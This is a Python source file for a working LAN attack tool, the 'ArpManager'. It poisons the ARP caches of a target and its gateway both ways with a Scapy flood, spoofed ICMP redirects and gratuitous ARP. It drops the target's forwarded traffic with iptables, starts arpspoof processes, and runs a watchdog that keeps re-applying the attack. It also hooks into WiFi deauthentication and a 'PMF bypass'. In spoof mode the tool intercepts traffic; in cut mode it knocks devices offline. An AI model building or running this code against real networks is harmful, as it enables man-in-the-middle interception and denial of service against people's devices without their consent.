"""
network/arp.py — 5-Layer ArpManager: the godly cut engine.

Layer 1: iptables FORWARD DROP       — kernel, instant, survives everything
Layer 2: Scapy ARP flood @ 0.3 s    — poisons both caches, both directions
Layer 3: arpspoof binary bi-dir      — belt-and-suspenders fallback
Layer 4: Watchdog @ 0.5 s           — re-applies 1+2+3 if anything slips
Layer 5: WiFi Deauth (via deauth.py) — radio-level disconnect for WiFi clients

Proper restore(): sends 5× real ARP replies with correct gateway/target MACs
to flush poisoned caches — the old version's restore_all() was literally `pass`.
"""
from __future__ import annotations

import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time

_IS_WINDOWS = sys.platform == "win32"

try:
    from scapy.all import ARP, Ether, srp, sendp
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


class ArpManager:
    ARP_INTERVAL      = 0.3   # seconds between ARP flood bursts (3× faster than old)
    WATCHDOG_INTERVAL = 0.5   # seconds between watchdog re-apply sweeps (2× faster than old)

    def __init__(self):
        self._lock     = threading.Lock()
        self._cut_ips: dict[str, dict] = {}   # ip → {gateway, iface, target_mac, gw_mac, my_mac}
        self._procs:   dict[str, list] = {}   # ip → [arpspoof procs]
        self._flood_stops: dict[str, threading.Event] = {}
        self._watchdog_running = False
        # Optional deauth manager (injected externally if WiFi)
        self.deauth_mgr = None
        self._safe_mode = False

    def set_safe_mode(self, enabled: bool):
        self._safe_mode = enabled
        self.ARP_INTERVAL = 1.0 if enabled else 0.3
        self.WATCHDOG_INTERVAL = 2.0 if enabled else 0.5

    # ── Public API ──────────────────────────────────────────────────────────

    def cut(self, ip: str, gateway: str, iface: str, my_ip: str) -> bool:
        """Apply a persistent cut using all 5 layers."""
        # L1: kernel DROP
        self._apply_drop(ip)
        # Poisoning layers (L2-L5)
        return self.spoof(ip, gateway, iface, my_ip, mode="cut")

    def spoof(self, ip: str, gateway: str, iface: str, my_ip: str, mode: str = "spoof") -> bool:
        """Poison the ARP cache to intercept traffic without dropping it (Monitoring)."""
        target_mac, gw_mac, my_mac = self._resolve_macs(ip, gateway, iface)

        with self._lock:
            self._cut_ips[ip] = {
                "gateway":    gateway,
                "iface":      iface,
                "my_ip":      my_ip,
                "target_mac": target_mac,
                "gw_mac":     gw_mac,
                "my_mac":     my_mac,
                "mode":       mode,
            }

        if not target_mac:
            return False   # Cannot spoof without target MAC

        # Ensure IP Forwarding is on
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

        # L2: Scapy ARP flood
        if SCAPY_OK and my_mac:
            self._start_flood(ip, gateway, iface, target_mac, gw_mac, my_mac, my_ip)

        # L3: arpspoof binary fallback
        self._start_arpspoof(ip, gateway, iface)

        # L4: Watchdog
        if not self._watchdog_running:
            self._watchdog_running = True
            threading.Thread(target=self._watchdog,
                             daemon=True, name="arp_watchdog").start()

        # Optional WiFi deauth (only for cuts)
        # Note: We usually don't deauth for monitoring as it disconnects the user
        return True


    def restore(self, ip: str):
        """Remove all cut layers and restore ARP caches properly."""
        self._stop_flood(ip)

        with self._lock:
            info  = self._cut_ips.pop(ip, {})
            procs = self._procs.pop(ip, [])

        if self.deauth_mgr:
            self.deauth_mgr.stop(ip)
            t_mac = info.get("target_mac")
            if t_mac:
                self.deauth_mgr.stop_pmf_bypass(t_mac)

        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:
                try: p.terminate()
                except Exception: pass

        self._remove_drop(ip)

        # Send real ARP replies to restore poisoned caches
        if info and SCAPY_OK:
            self._send_restore(
                ip,
                info.get("target_mac", ""),
                info.get("gateway", ""),
                info.get("gw_mac", ""),
                info.get("my_mac", ""),
                info.get("iface", ""),
            )

    def restore_all(self):
        with self._lock:
            ips = list(self._cut_ips.keys())
        for ip in ips:
            self.restore(ip)

    def stop_watchdog(self):
        self._watchdog_running = False
        with self._lock:
            stops = list(self._flood_stops.values())
        for evt in stops:
            evt.set()

    # ── MAC resolution ──────────────────────────────────────────────────────

    def _resolve_macs(self, target_ip: str, gateway_ip: str, iface: str):
        """
        Resolve target MAC, gateway MAC, and our own MAC via Scapy ARP probes.
        Returns (target_mac, gw_mac, my_mac) — any can be "" on failure.
        """
        target_mac = gw_mac = my_mac = ""
        if not SCAPY_OK:
            return target_mac, gw_mac, my_mac

        # Our MAC via ioctl
        try:
            import fcntl, struct
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                raw = fcntl.ioctl(s.fileno(), 0x8927,
                                  struct.pack("256s", iface[:15].encode()))
                my_mac = ":".join(f"{b:02x}" for b in raw[18:24])
            finally:
                s.close()
        except Exception:
            pass

        # Use Scapy first, then fallback to 'arp -n' system table
        for probe_ip, field in [(target_ip, "target_mac"), (gateway_ip, "gw_mac")]:
            # Try to force resolution by pinging if Scapy ARP fails
            try:
                # Use system ping to force an ARP table entry (flags differ by OS).
                if _IS_WINDOWS:
                    ping_cmd = ["ping", "-n", "1", "-w", "1000", probe_ip]
                else:
                    ping_cmd = ["ping", "-c", "1", "-W", "1", probe_ip]
                subprocess.run(ping_cmd, capture_output=True, timeout=2)
            except Exception:
                pass

            # Scapy probe (retries once)
            for _ in range(2):
                try:
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=probe_ip),
                        iface=iface, timeout=2, verbose=False)
                    if ans:
                        mac = ans[0][1].hwsrc
                        if field == "target_mac": target_mac = mac
                        else: gw_mac = mac
                        break
                except Exception:
                    pass
            
            # ARP Table fallback (Windows: `arp -a` uses dashes; Linux: `arp -n`)
            if (field == "target_mac" and not target_mac) or (field == "gw_mac" and not gw_mac):
                try:
                    arp_cmd = ["arp", "-a", probe_ip] if _IS_WINDOWS else ["arp", "-n", probe_ip]
                    r = subprocess.run(arp_cmd, capture_output=True, text=True)
                    m = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", r.stdout)
                    if m:
                        mac = m.group(1).replace("-", ":")
                        if field == "target_mac": target_mac = mac
                        else: gw_mac = mac
                except Exception:
                    pass

        return target_mac, gw_mac, my_mac

    # ── Layer 1: iptables DROP ──────────────────────────────────────────────

    def _apply_drop(self, ip: str):
        for flag in ("-s", "-d"):
            chk = subprocess.run(
                ["iptables", "-C", "FORWARD", flag, ip, "-j", "DROP"],
                capture_output=True)
            if chk.returncode != 0:
                subprocess.run(
                    ["iptables", "-I", "FORWARD", "1", flag, ip, "-j", "DROP"],
                    capture_output=True)

    def _remove_drop(self, ip: str):
        for _ in range(3):
            r1 = subprocess.run(
                ["iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"],
                capture_output=True)
            r2 = subprocess.run(
                ["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"],
                capture_output=True)
            if r1.returncode != 0 and r2.returncode != 0:
                break

    # ── Layer 2: Scapy ARP flood ─────────────────────────────────────────────

    def _start_flood(self, ip: str, gateway: str, iface: str,
                     target_mac: str, gw_mac: str, my_mac: str, my_ip: str):
        self._stop_flood(ip)
        stop_evt = threading.Event()
        with self._lock:
            self._flood_stops[ip] = stop_evt

        def _flood():
            # Packet A: tell TARGET "GW's IP is at MY mac"
            # Using both OP=1 (request) and OP=2 (reply) for max compatibility
            if target_mac:
                pkt_to_target_r = (
                    Ether(src=my_mac, dst=target_mac) /
                    ARP(op=2, hwsrc=my_mac, psrc=gateway,
                        hwdst=target_mac, pdst=ip))
                pkt_to_target_q = (
                    Ether(src=my_mac, dst=target_mac) /
                    ARP(op=1, hwsrc=my_mac, psrc=gateway,
                        hwdst="00:00:00:00:00:00", pdst=ip))
            else:
                pkt_to_target_r = (
                    Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=2, hwsrc=my_mac, psrc=gateway, pdst=ip))
                pkt_to_target_q = pkt_to_target_r # Fallback

            # Packet B: tell GATEWAY "target's IP is at MY mac"
            if gw_mac:
                pkt_to_gw_r = (
                    Ether(src=my_mac, dst=gw_mac) /
                    ARP(op=2, hwsrc=my_mac, psrc=ip,
                        hwdst=gw_mac, pdst=gateway))
                pkt_to_gw_q = (
                    Ether(src=my_mac, dst=gw_mac) /
                    ARP(op=1, hwsrc=my_mac, psrc=ip,
                        hwdst="00:00:00:00:00:00", pdst=gateway))
            else:
                pkt_to_gw_r = (
                    Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=2, hwsrc=my_mac, psrc=ip, pdst=gateway))
                pkt_to_gw_q = pkt_to_gw_r

            # Packet C: ICMP Redirect (Godly layer)
            # Tells target "Gateway is better accessed via Me"
            if target_mac and gw_mac:
                try:
                    from scapy.all import ICMP, IP, send
                    pkt_redirect = (
                        IP(src=gateway, dst=ip) / 
                        ICMP(type=5, code=1, gw=my_ip)
                    )
                except ImportError:
                    pkt_redirect = None
            else:
                pkt_redirect = None
            
            # Guard: If we don't have essential MACs, redirect might fail or be noisy
            if not target_mac or not gw_mac:
                pkt_redirect = None

            # Packet D: Gratuitous ARP (Broadcasting our presence)
            pkt_garp = (
                Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") /
                ARP(op=2, hwsrc=my_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway)
            )

            while not stop_evt.is_set():
                try:
                    sendp(pkt_to_target_r, iface=iface, verbose=False)
                    sendp(pkt_to_target_q, iface=iface, verbose=False)
                    sendp(pkt_to_gw_r,     iface=iface, verbose=False)
                    sendp(pkt_to_gw_q,     iface=iface, verbose=False)
                    sendp(pkt_garp,        iface=iface, verbose=False)
                    if pkt_redirect:
                        send(pkt_redirect, verbose=False, count=2) # Double strike
                except Exception:
                    pass
                stop_evt.wait(self.ARP_INTERVAL)

        threading.Thread(target=_flood, daemon=True,
                         name=f"arp_flood_{ip}").start()

    def _stop_flood(self, ip: str):
        with self._lock:
            evt = self._flood_stops.pop(ip, None)
        if evt:
            evt.set()

    # ── Layer 3: arpspoof binary fallback ────────────────────────────────────

    def _start_arpspoof(self, ip: str, gateway: str, iface: str):
        arpspoof = shutil.which("arpspoof")
        if not arpspoof:
            return
        with self._lock:
            old = self._procs.pop(ip, [])
        for p in old:
            try: os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception: pass

        procs = []
        for target, spoof in [(ip, gateway), (gateway, ip)]:
            try:
                p = subprocess.Popen(
                    [arpspoof, "-i", iface, "-t", target, spoof],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid)
                procs.append(p)
            except Exception:
                pass

        with self._lock:
            if ip in self._cut_ips:
                self._procs[ip] = procs

    # ── Restore ARP caches ───────────────────────────────────────────────────

    def _send_restore(self, ip: str, target_mac: str, gateway: str,
                      gw_mac: str, my_mac: str, iface: str):
        """Send 5× real ARP replies to flush poisoned caches on both sides."""
        try:
            pkts = []
            # To TARGET: "gateway's IP is at GATEWAY's real mac"
            if target_mac and gw_mac:
                pkts.append(
                    Ether(src=gw_mac, dst=target_mac) /
                    ARP(op=2, hwsrc=gw_mac, psrc=gateway,
                        hwdst=target_mac, pdst=ip))
            # To GATEWAY: "target's IP is at TARGET's real mac"
            if gw_mac and target_mac:
                pkts.append(
                    Ether(src=target_mac, dst=gw_mac) /
                    ARP(op=2, hwsrc=target_mac, psrc=ip,
                        hwdst=gw_mac, pdst=gateway))
            for pkt in pkts:
                sendp(pkt, iface=iface, count=20, inter=0.05, verbose=False)
        except Exception:
            pass

    # ── Layer 4: Watchdog ────────────────────────────────────────────────────

    def _watchdog(self):
        while self._watchdog_running:
            time.sleep(self.WATCHDOG_INTERVAL)
            with self._lock:
                targets = dict(self._cut_ips)
            if not targets:
                continue
            for ip, info in targets.items():
                # Re-enforce DROP only if in cut mode
                if info.get("mode") == "cut":
                    self._apply_drop(ip)

                # Restart flood if dead
                with self._lock:
                    evt   = self._flood_stops.get(ip)
                    alive = evt is not None and not evt.is_set()
                if not alive and SCAPY_OK and info.get("my_mac"):
                    self._start_flood(
                        ip, info["gateway"], info["iface"],
                        info.get("target_mac", ""),
                        info.get("gw_mac", ""),
                        info["my_mac"],
                        info.get("my_ip", ""))

                # Restart dead arpspoof processes
                with self._lock:
                    procs = self._procs.get(ip, [])
                if shutil.which("arpspoof"):
                    dead = any(p.poll() is not None for p in procs) if procs else True
                    if dead:
                        self._start_arpspoof(ip, info["gateway"], info["iface"])